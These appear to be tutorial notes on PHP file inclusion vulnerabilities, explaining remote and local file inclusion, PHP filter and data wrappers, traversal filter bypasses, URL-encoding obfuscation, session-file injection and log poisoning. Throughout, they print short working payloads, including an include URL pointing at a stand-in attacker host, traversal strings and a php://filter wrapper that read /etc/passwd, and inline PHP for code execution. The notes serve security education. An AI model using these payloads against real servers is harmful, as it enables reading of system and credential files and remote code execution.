## Basics of File Inclusion
A traversal string, commonly seen as `../`, is used in path traversal attacks to navigate through the directory structure of a file system.

Relative pathing refers to locating files based on the current directory.
Absolute pathing involves specifying the complete path starting from the root directory.
## Remote File Inclusion

Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.

Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like `include.php?page=http://attacker.com/exploit.php`, an attacker can replace the URL with a path to a malicious script.
#### Local File Inclusion
Local File Inclusion, or LFI, typically occurs when an attacker exploits vulnerable input fields to access or execute files on the server. Attackers usually exploit poorly sanitized input fields to manipulate file paths, aiming to access files outside the intended directory. For example, using a traversal string, an attacker might access sensitive files like `include.php?page=../../../../etc/passwd`.
## PHP Wrappers
PHP wrappers are part of PHP's functionality that allows users access to various data streams. Wrappers can also access or execute code through built-in PHP protocols, which may lead to significant security risks if not properly handled.
For instance, an application vulnerable to LFI might include files based on a user-supplied input without sufficient validation. In such cases, attackers can use the `php://filter` filter. This filter allows a user to perform basic modification operations on the data before it's read or written. For example, if an attacker wants to encode the contents of an included file like `/etc/passwd` in base64. This can be achieved by using the `convert.base64-encode` conversion filter of the wrapper. The final payload will then be `php://filter/convert.base64-encode/resource=/etc/passwd`

#### Data Wrapper

The data stream wrapper is another example of PHP's wrapper functionality. The `data://` wrapper allows inline data embedding. It is used to embed small amounts of data directly into the application code. Use the payload `data:text/plain,<?php%20phpinfo();%20?>`. This URL could cause PHP code execution, displaying the PHP configuration details.

## Base Directory Breakout
The PHP function `containsStr` checks if a substring exists within a string. The if condition checks two things. First, if `$_GET['page']` does not contain the substring `../..`, and if `$_GET['page']` contains the substring `/var/www/html`, however, `..//..//` bypasses this filter because it still effectively navigates up two directories.
## Obfuscation
Encoding transforms characters into a different format. In LFI, attackers commonly use URL encoding (percent-encoding), where characters are represented using percentage symbols followed by hexadecimal values. For instance, `../` can be encoded or obfuscated in several ways to bypass simple filters.
- Standard URL Encoding: `../` becomes `%2e%2e%2f`
- Double Encoding: Useful if the application decodes inputs twice. `../` becomes `%252e%252e%252f`
- Obfuscation: Attackers can use payloads like `....//`, which help in avoiding detection by simple string matching or filtering mechanisms.
## PHP Session Files

PHP session files can also be used in an LFI attack, leading to Remote Code Execution, particularly if an attacker can manipulate the session data. In a typical web application, session data is stored in files on the server. If an attacker can inject malicious code into these session files, and if the application includes these files through an LFI vulnerability, this can lead to code execution.
An attacker could exploit this vulnerability by injecting a PHP code into their session variable by using `<?php echo phpinfo(); ?>` in the page parameter.

## Log Poisoning

Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. This method is particularly stealthy because log files are shared and are a seemingly harmless part of web server operations. In a log poisoning attack, the attacker must first inject malicious PHP code into a log file. This can be done in various ways, such as crafting an evil user agent, sending a payload via URL using Netcat, or a referrer header that the server logs. Once the PHP code is in the log file, the attacker can exploit an LFI vulnerability to include it as a standard PHP file. This causes the server to execute the malicious code contained in the log file, leading to RCE.

